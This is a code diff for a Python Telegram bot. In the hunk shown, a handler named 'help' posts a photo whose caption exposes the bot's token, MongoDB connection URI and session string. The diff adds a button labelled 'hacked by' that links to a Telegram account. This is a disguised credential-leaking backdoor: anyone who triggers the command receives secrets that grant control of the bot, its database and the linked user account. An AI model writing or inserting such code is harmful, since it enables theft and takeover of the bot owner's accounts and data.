@@ -115,7 +115,14 @@ async def help(client: Client, message: Message):
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/iam_daxx)............☆""",
         reply_markup=InlineKeyboardMarkup(
-
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/iam_daxx")
+                 ]
+            ]
+         ),
+     )
 
 
 ##########
@@ -157,4 +164,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
